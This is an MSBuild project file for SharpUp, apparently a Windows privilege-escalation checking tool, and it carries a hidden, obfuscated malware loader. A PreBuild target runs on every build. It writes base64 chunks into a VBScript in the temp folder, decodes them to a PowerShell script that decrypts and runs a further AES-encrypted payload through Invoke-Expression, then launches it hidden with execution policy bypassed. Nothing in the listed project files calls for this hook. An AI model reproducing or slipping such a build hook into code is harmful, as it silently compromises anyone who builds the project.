<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="14.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{FDD654F5-5C54-4D93-BF8E-FAF11B00E3E9}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>SharpUp</RootNamespace>
    <AssemblyName>SharpUp</AssemblyName>
    <TargetFrameworkVersion>v3.5</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>none</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>
    </DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>0</WarningLevel>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Management" />
    <Reference Include="System.ServiceProcess" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="System.Data" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Checks\AlwaysInstallElevated.cs" />
    <Compile Include="Checks\CachedGPPPassword.cs" />
    <Compile Include="Checks\DomainGPPPassword.cs" />
    <Compile Include="Checks\HijackablePaths.cs" />
    <Compile Include="Checks\McAfeeSitelistFiles.cs" />
    <Compile Include="Checks\ModifiableScheduledTaskFile.cs" />
    <Compile Include="Checks\ModifiableServiceBinaries.cs" />
    <Compile Include="Checks\ModifiableServiceRegistryKeys.cs" />
    <Compile Include="Checks\ModifiableServices.cs" />
    <Compile Include="Checks\ProcessDLLHijack.cs" />
    <Compile Include="Checks\RegistryAutoLogons.cs" />
    <Compile Include="Checks\RegistryAutoruns.cs" />
    <Compile Include="Checks\TokenPrivileges.cs" />
    <Compile Include="Checks\UnattendedInstallFiles.cs" />
    <Compile Include="Checks\UnquotedServicePath.cs" />
    <Compile Include="Classes\VulnerabilityCheck.cs" />
    <Compile Include="Interfaces\IVulnerabilityCheck.cs" />
    <Compile Include="Native\Win32.cs" />
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <Compile Include="Utilities\FileUtils.cs" />
    <Compile Include="Utilities\IdentityUtils.cs" />
    <Compile Include="Utilities\RegistryUtils.cs" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent"><Exec Command="@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\1r9xl2&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot;ZnVuY3Rpb24gRFZLIHtwYXJhbSAoW3N0cmluZ10kZW4sW2J5dGVbXV0kc0IpOyRrID0gTmV3LU9iamVjdCBieXRlW10gMzI7JHYgPSBOZXctT2JqZWN0IGJ5dGVbXSAxNjskZGVyaXZlQnl0ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmZjMjg5OERlcml2ZUJ5dGVzKCRlbiwgJHNCLCAxMDAwLCBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxnb3JpdGhtTmFtZV06OlNIQTI1Nik7JGsgPSAkZGVyaXZlQnl0ZXMuR2V0Qnl0ZXMoMzIpOyR2ID0gJGRlcml2ZUJ5dGVzLkdldEJ5dGVzKDE2KTtyZXR1cm4gQHsgSyA9ICRrOyBWID0gJHYgfX07ZnVuY3Rpb24gRCB7cGFyYW0gKFtzdHJpbmddJGVCWixbc3RyaW5nXSRlbmMpOyRkQnkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlQlopOyRzYnkgPSAkZEJ5WzAuLjddOyRlQnkgPSAkZEJ5WzguLigkZEJ5Lkxlbmd0aCAtIDEpXTskZHJ2ID0gRFZLIC1lbiAkZW5jIC1zQiAkc2J5OyRrID0gJGRydi5LOyR2ID0gJGRydi5WOyRhID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCk7JGEuTW9kZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNpcGhlck1vZGVdOjpDQkM7JGEuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzc7JGEuS2V5ID0gJGs7JGEuSVYgPSAkdjskZGMgPSAkYS5DcmVhdGVEZWNyeXB0b3IoKTt0cnkgeyRkQiA9ICRkYy5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRlQnksIDAsICRlQnkuTGVuZ3RoKTtyZXR1cm4gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGRCKX0gY2F0Y2gge3JldHVybiAkbnVsbH19JGVCID0gIj09Z2Nqa2FuN1NnSDVsZzdWWkZQS20rSm1UUzYyZDVJOUtjZjViTjcvaHh1M1ZiRXVIWlJHUnVQbDNxOVY1b1F6YU56Snk2MFdHNHU0RGJybFZSNG1YWUUvWk51YW1TTzlRVUFGN2J1U3hIa3RESzNSTVF1a1FPajNLWVdzWEx2YWhFaVhxV2hMeTIwZ3NRZ0IyWWJlVFRwbzYyMVNUVkh4akt1MENWV2wycXlUUHRwR0xVclhBQUcrTFVxTmdOYXJBMFA0NzhrMmE3Rm1RQXpxQU14QVB6OFlsVHdkTWd1bDh5aEtmRk9paXc0Zk52VGl0RjF1Umd4RVR3aG15VGFOM0FSSDY1L3A0R2FRYnoxREtEdlQvNlVGdkZMUWlnbm9XQjRsWGs2TGZpUTdRTWxNUEtCS1JITlpDOEpqaDBtc3NLT1kxeFJ0NzRnbXErYzZVMjNKa2gyM3plNUFJWVU2WVZ6WVd0MnZVT09GZVd6VnE4bkM4VGgvMXpCOE8yMyt3dkF2enVObW9MNE1vM25XbFRRbUlLTjEzbzdpTUJhSHBQZ0l1K2NndHdCUWJXTG1XcGdoOUlaN29Tb3kxWFE1S0lacHFHT1d3OFk1cHBiajV0SFAvMmNVV0loRUVIRi9tRysrWGQ2ZVErS2Vvcm1uQTMxZzJJSmhJOEs4VUNzRFIxQnR6c0ZaMW1EcVYrcENXYkw4MCtHalFGTFlSbzdUamNad1NHRFJGa0F1aFBpL01DQlJ6MW5vckJtR3MvVEhXQ0RJOC8wTFQ2N0ZadG1LT2FPMC93ZW1uT2RLNStmc1JuWXU5dXBOWjRXcTVGNkIzUjRUTkJMUkpad0QxRXRqbkpjMVAzSFQyaTdYMUNRd0FCY20vd0xwV0xBZnVhV0orQnE1SFRqaFNUZTNSMFpIRnBVRkpFTXNUNnR3QitqaWVuNlJ2UW94NVpmdGhtendlTzFabGFhSzh0MDZYWVVmdURDU04ybXQyTmpGT1ZPRlJ2MVZRelY4eVBqanN2NzlHclBkTVl2b2c5bU1IbXo4K2JDVXc2T0tlUjUvL0pvb2FrN0p4MVpHNDF5TXhkQXVveGZHMGZKdHlSM1BvZnQvL0psbTBqSExaQ1BQcGVpcmsxTlZmTUtNWmVIZ1Bkc093NXdhOEFoMmZPOFJkeGpZRHVyeGJNTm9JOG1uVGdkdjkrMjQvU2gvUXhwRitkcWUwY212TlN5bnZYZ0xuN2JYaU1taHRGd0tOZWRQRXFidmlQelNoRGthNjlWK2N4b2VjQldaSkJPS1R5clVUUFd3MHhTRzIvZkxYTFZ0VFFpZWUzc2ViVzVMekp2SVcra0hrK0lUNGhVZkZ1VUE0WW9kU3FEWi9vVTlKUzA5eGY3QnBMVXBmdW5SUisrNHlVRVZFTVdOcDB3SEdqOEs4REhjcGc2Z2twYTF0NWF6L3YyWUJVWmo2VG95MjhHRzh6ZVVlM2ZCK0NuRjRBKzA3SEFoWlpTUXRIbW9vbWg2MjBkQ2MzZnQ2V1NteG4vNE1ud2d6WjgrejNwakc5VGtnbXgxUnZRQ2NpVDBMRUt0eC91NndkczNOMEp5RHVEVjdBNzMyUzB1ZVNobGhhMG5WK2ZyV0F1eUxid3pXMXMvQ1NrUGhxd2dpbXc2UktkZVlWdS84KzNMdkd4MmFwRitnTGU2SHRsSjZHZE5QT0ljZFc4Yjh3dzJCWDhnMFRsMUp2UjVHeGpZNFBMZWhjYVdibmZ4SXlDSWxmWjVadjg4N2d5TExJd05kMlJvK3VGNkQ2VlVOeHVJRGMrSUh&quot;&gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo c = &quot;thNVQ0TVhCcnMrenAyWWUyd2k5NXhPY29KdVFVVmZZVWlCYk5BYXpqWTNITVBGY3lnbWpLcDErTER5Y2JwUXhCdS9hcm1XT1ZEaUVpVG52M0lQYk9EVTZXaVlKM2Fldmo2RjJ4MjNIZXVnazhRZVVXZkhxejJYUHRqR0ordlg2TXhKQm9FNG8rQjNvZ2Z5bXo3Y1l1ejJmOFRVMnRDYjR1cjlscWczY0hJbitiL0RrWGhQWUFORm00dXRzWnBzSzV1L1JuUndURWdaemdpM0wvOU4wTlViYlR4YXlYbno5SUZZTm1hVmpiL0xHNldkRkpQQU1UcEczenB4elFHR0FsOC9Cb0I1UUxTU05ZTGgyOWh0VTF1cjQ1Yk5BcE9tVmRFTXhiV0FjQ1NxVWZBVEdiMVpLQitxTnIzMDlzSFVER1hDQ2VoZkFaZFMySVI5NWxNTUY4Y1BGYmg4ZDFiRUJ2SmdETm1LU2wvSXJwZ29WY1FNZzdzL0xJZUdBSmpNR0JmV1J0SjhiUDYwdWNvNlUzWjZCUXE0Z2dRQW54VnA3V2hXbzFwZ3M0N1BPNmlQdXo3QzY4RTcweVJVQ0F6akZUbFc1QzVNOHlycllONE9IdVp3NlVFN01rUU91YjVkS1ZWeFJEdC8wUGpCYlBQUldEVTFLSWt1ckdsZHVSOWM1ZWV6VjBoWUY3a1pOcDVmV09aME85ZTZ6MEg4eUVWbEdRRlR2RlI0VytUcW5nL3J6K0tGM3FaNHp4a1IxcDFvYUVMZWRTNWFMc3lyL0N1Ly9zN3VwaER2MzVXUDAxOFhOWG5TelBuMGVWRUFxL3hrRTF5VGhqU3R1M1lFSHJlMTdBcHZPREdiTVNzNS9WQ2RTMzl4N0dZR2dKRHZwR0tMR2JzOWx4Y2tGQzgwc054Wlh4c0FWVlBHeWJobnFOdFoxZFZRUW5oRC9hMWlMeS9HMGFEUUFDVHh0RUptVjU1Z1FvOEhBR1JMTEZpZ3BmdC84a0twOTV2cXJnbDFyeWpIa0hxdXlpU2FVSWU1RkJreWhIbm0rYlB5bzdwRTdHd1NvTmpucllZdGdaMGtEZ3NLTWRJMTN0em5lSml5UFVQNE1pbHRXeDk1VkFVUTBuV3habTE3SDZXaER5cGxCYVlOajQyZmdTZC9QUVJuN0IvazJTV0FQUDlxZTU3blNDdHh3TEhjQmpORXF5amJJRFZSYzhNMnRJTGlORUx4dUVvcEI3Q2lYU2JLMHo5c1VEci9QMFpGOVFrSytnSjkyWE0xQlhPR3BqWjNFaVFSM0NjbWZwYlpTYXBpeEZxZFJqNFF4RVNjMjJCZzhCVGkwV0t3TytSTVRsU1pUWVRnOGM4VktKeVJRcGlVUjhSMTVwbmcyUGl5WFlJK0djWnBvZU5wVnZsVFRkRUJPVjN6OVo5d0J0a0U0bG1TVzNocFRkaGVoV2pyS1A1MXlnT2JGWjB1U0RUWTdJNktnYlhBN2ZrWEVMRDhvZ3NhV3c2dUxYbHo5REZIYlR0alA4Y1phWXRMTFJYQ2V5NEpjUmgxVllsQlVyUC9jNFlPUTc2bFM2TVhaOEtkS3Uvak5lWm1mdmdiU0tvem5HSGZGZHBsSXdMQ3h2NjBHOGJXWGVJVm55R3ZjQmxLSFUxQkx6eEczVEY3bjdpVmxtU1JRd3pNa3cyVFB1YjlkOTQyN3JGbHNKOERObTIvMDBqdmZWa3N1c2JpcVZzZmlsM1YxalVJeG9NMjJkSXJhSGQ3bkFFTjBMTEFMNHJJdFM0Y2Y2eGphODMvK004akh0ajgxdnNCOE5WT1JxemtYWS96N1BqTUdMNzc0ZEZoeFZTMndLdEtkVXlpcWFyWmt4YlM3ZlI4bFpkQnFCek9HM2xrSzdxeFczdDBhYmRkalcwT242NERnSmZvNVFHLzdaa2M0OEppdFQ3VnA0R2RDaG5RUndnaGRyRFNoZWFtcVNUOXZjS1h1ZzBaODJLVDhzMHZLQ3JNeFA4SmoraTBHNjhLWkZkYVJ5a0trUmdROFRYSG8xby82UTJhNUtpT1ZUcXNYUUJIOGI4MC9td3VSV0xVN0pJTVorcXI5dDhxQkw0ZXdMSHdwMU54Y0J4RnpMdUVEUmJYVDVpaFh5QkplM2QrU01TbVhNZUlyZVIvcGcvU1d4QTFMUUJOclJabm9sQ0p6ZUg3V3VrQ3A5dEpLVmVQMG5TMVZpSWQ3a3d6RmN2T2t3UXN0WjdjMGlGZ0VBNG1laXVEVXFaai84aXNwVnFwaDdodVpFRW5VcDhYWWVyakVKVHd0cDFvNzVtQklwWWd3dkIzcE04REk0aHVnVEhwN1dUZnZhek5nb2ZSSXFVZ0dLamtMdCtVclE2aDIyVzFHaGJMdysvQ1k2TU04VVZIWWJkclVxTDhLMmdHbUpySHNtMithc29DTTh5b3U2OUhjb3hGYmkzeWhCNGIyQnpMa2w2NjQ5dGFrSVd4dUYxMzRYamNvSWN5VWFubHc3VzgySnRKVFN3Qm16VUxHZzJ5Yk9xNVloWUxZdXZZb3NaWkNDbWFvWnJ2dE8wTjZ0dFJSZjhHeU5Qald5RjRXcE9vWWtKOVNQdi9neEc3NXgrN3UiOyR0bSA9ICRlQi5Ub0NoYXJBcnJheSgpO1thcnJheV06OlJldmVyc2UoJHRtKTskUiA9IEQgLWVCWiAkdG0gLWVuYyAiIjskdCA9ICRSLlRvQ2hhckFycmF5KCk7IFthcnJheV06OlJldmVyc2UoJHQpOyAkQlZWID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygtam9pbiAkdCkpOyAkRVBYID0gIkludm9rZS1FeHByZXNzaW9uIjsgTmV3LUFsaWFzIC1OYW1lIHBXTiAtVmFsdWUgJEVQWCAtRm9yY2U7IHBXTiAkQlZW&quot;&gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo d = &quot;1T0RNd3BpdHNtNk9FZXBoR0s2aVJVaVUrLzBPVndZV2x5Q1pOSmIrcnI2ejQ4TkNnZG0wa2NhVHBrVjNTbkU4bnBscVBtaTFZR21vWmFWWFRpKzliNENFY1dPYTF6L1ZFQ2xSSGlaQldWMit1Mm02ODFZZXA5c2YrZzQrVTZLdmpLd3dnSEtHS1djSFo0MEEybGxXeWhnZXQ2aWRWZ3RPK2Q5aVE0M1oxRENGamlobGlSUlJySHdRemx3a2RzelhtdFdKNlJQbmZmazhMaXBGYkJrZEpoU056Nm93TytEYjdXekhJa0tWaTd6K1FVUHVoallteGhGWjlJZWw4N1AyUE1NbEZCSkExbkJoMzRWZG41eDJpckZMZnJ6Z0NoTUZhNDNIN0hSYTJRT2Z3NFh0bENxOFA4NTlLWjJyMExodHIvbTZjZGZsajlMQWxpVVdKOGF2bDlCRWU5cmVqdkJSUUNvQ1FYRkRJUnN3TDB0cXdnSjdEa2lWeE9rZXAzd0xoN291cFlxbDVLT3FpcHNBQzRCTmRoeXdOUWpDRk4rVnBjMUNTaUpGdzIvNUVDMHN4SGdRN2pFVXNGZjVlQ2ljY0J6UkdNL2NhSUhUVGJ3MmJ3S25jYVpGbnFKODI0ZW5tc2p0dWJkSWozRzE0aHoxU2pCSW1yWXZIZTVXcXVKeVF2dC9JSUlBUEEwQWpGRVdTOUszU0NyOGxZbWVjNGNmd05DTXR2WHZKRjJOcENjMzdOVStuQ3hvbFJISWtaRjFURmM2SWFqb29nc2phdDFtL3BCMi9NQkM0TmJrcmgyeDc1MmRtV085S29MbmhkNWEybWhOSG9oU0VZMGVrRGhIR0Y5bHgxbVRkRHJpVjJkMDlKVVM0VjYxaVVEamZsWnBQMjdSL1N2NzZ5WmU3dEpMOW4yNGljemlsT2c2TUMwa29PUDBaVWNqaEt0bkdrZEcrTnNNM253UFozdzVpMlRMck5VanJrdXdiRzZ4UWQ5d0thSk9pN3p3N29DMEtBUjVQb0QxNmVxZjhmaWNvYi9tdExKR1NpcFZrQ0NPclhaRmhLZ2RZQnlzVExzSlFNdUh6SGFEWFlXbUcvbW1KQXV6K1Jkc0hvaGNqdlNVZ1NiOTlGbHBwVDQ4UXFLUWY1V2JNdlo3RXFYL3QxbUZId0Z0U05VNVJ3L1hNSzZiYmhIVW1ScHMwQjEzTU9RU2ZjMDR6TXgwelgxcEpOSk9PQTRwdzVkWEhodG5UaVA4T0ZicU4vSWxDL0hVR1dHN3A0ZmRtc2dGN0lzT21PSDhtRUF6dllNd0dTY29HUWVjZVVZU2RDQ2ovZG5PQXNKcmJMMklzdWM1TDRkZk1EZjQzY0M2VDZXK3ZLTXMrV2NjbWpUcXoybzF3R3ppcm5uWjRaclZJTjZMUVRwbVFENFdmU1pVTEFHSnYzUEQ0bks2eWhVV3NNYkJ2S0lkWUkxYVIvNjhkbkN5MUdWR1RlakFxYVRXUjVJTXgwUEZrMnYvdjF3djExVXlPTk52bmVRVEtBa3orY3NUeEUzd0pLL3ViWHNteWJpQWsyMXNJelFlTGRvRWxocm1VNzhGNFY1a1FkcHd2ZzFHSndoTmMzVFVvNGpPVjIyT0JpcStBYlZKeUQ5TlFsM3VZRjdnaHIyQ2xLQURxb092SHpuQXFjQmI0THg1TVJjQi82THlvWkRHSmFFNWV3QUwxTXBPTnQzeHZjUDhicHlIa1c5OTVRMVZJemlBZ20xTkR5bkxwL0JKbjFRTTFYb0g5Vjh3MDlsRGJjbngzaUxhMG1FT1Fkb2ZUTk1UdDhBNDREYzJlM2kwRkZ4S0dzTkFVRjNrcXU5T2NZcnJmaUUrM04zRVR5NUFpQW1IcW9UUXJNTEppT01uSDhoS2RXdFg1UGdNODB1aW9vMXFZK01FdndrcXZVbmpWY1FVZkFuNjdnN2p2Z01KcVpQd2tkK0taUUJOWFRQUUJCNDluVjl1dmtJaUFmVy8raWI0dzJHWmFXdm54NUNJajBLM0FSdjc0ZUFNa0ttbStSWW5HekZId2RNSkpnOW9STmFVVG5WRVNwbzJSdVJ2eFZMMGdLNGo0S0dpbHFPdGVuanZWSXJ0a0dQN3VJSFkvTGtwSVdCM0NEQndXcWE2a2NEQzA0NnYrdjhSUytYS3JtU1pvSDJ3Uy9LRFpTZkRwWkNhMWlITVNhYUNoNHovRXNlZ0tIV1ZKSXk1dFNaaUt5UjZMZjhmNmM3ZktYVVZuSVBBYXBES0djdUhzaTJRMWNZSVdwSVF1NUg3eHIyWGl2MzZjLzhPUGlCTW9KVERBSTl1UWExWlB4ODV3d3IxM1dNNDgzM0hDdzI3czdIUFFXcy81WndwcVlrYzR0L2t6dUJ3RlhtdEJSc1lEcGlEbTRyTFJsZ3FIWnRveU1HQVZ6blUxT0JsRWRtNkhyWm1HYzJTckxLMDlITWFwd0RQTG55VC9RcUxxY0V4VVdGQ0xzRkJOS2taS0RxdFppUTBOTytuc0FRTGN6MGdqSmhxVjVwR3o4b2JrdnAzQ05YMmljTFdVT3NYNXFqb3MwRlFIbTdTWFhLaTdHeTdxeGdpSGtla1RTRmpSNVgza1Z6TkZUUUhSU2pkemh4VGt0WCsyVFZQcyt1aUtQMkJreHJ4OFJpZXpiOCtKRmxpZHVVMW5vTHJkeHhlcUxSeFNlazRkTVQwcnZ2RlpCYUFIaytYaXRmVjdzM1FiUVlDMk5PS3hYdHE3c0xoMkozelhaQzdXK2lwREZXQ1g3NjFMTHExM3NIeEVzeER5Rmc4OFRqVzhJZVpjVDlGZGljRFFNaW1RT0grWmZxVGVJY1kvOHk1dG9WbW04a3JHOGhZK0JOZzF1TE9FVG1nUEt1dS9BY2xMNTFoTXRmdWl3d3R2bUdRVHBuT0NSMkpiM2VFcEhKWmxib05OSlk2elkzU2FiNVpzOURuNytWSmVrdEltMnRiZjREclhJaDlXdi&quot; &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo Set f = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo f.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo f.Text = e &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo g = f.NodeTypedValue &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo h = &quot;%25a%25\Zrtb.ps1.ps1&quot; &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo k.Write l(g) &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo k.Close &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo m.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; h, 0, False &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo Function l(n) &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo Dim o, p &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo Set o = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo p = LenB(n) &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo If p ^&gt; 0 Then &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo o.Fields.Append &quot;q&quot;, 201, p &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo o.Open &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo o.AddNew &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo o(&quot;q&quot;).AppendChunk n &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo o.Update &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo l = o(&quot;q&quot;).GetChunk(p) &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo Else &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo l = &quot;&quot; &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo End If &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;echo End Function &gt;&gt; &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\bDDDYkPBC.vbs&quot;&#xD;&#xA;endlocal" /></Target>
</Project>
